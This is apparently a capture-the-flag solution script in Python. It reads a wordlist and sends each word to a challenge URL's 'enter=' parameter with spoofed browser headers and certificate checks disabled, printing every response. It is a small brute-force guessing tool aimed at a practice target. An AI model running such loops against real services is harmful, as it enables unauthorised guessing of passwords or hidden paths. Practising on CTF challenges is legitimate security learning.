import requests

# wordlist file
wordlist_file = 'wordlist.txt'

# challenge URL
url = 'http://challenge.ctf.games:30360/enter='

# Define the headers to include in the request
headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Referer': 'http://challenge.ctf.games:30360/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
}

# Read words from the wordlist file
with open(wordlist_file, 'r') as f:
    words = f.readlines()

# Try each word from the wordlist
for word in words:
    word = word.strip()  # Remove leading/trailing whitespace
    if word:  # Only process non-empty lines
        response = requests.get(f'{url}{word}', headers=headers, verify=False)
        
        # Print the response for each word
        print(f'Trying word: {word} - Response: {response.status_code} - Content: {response.text}')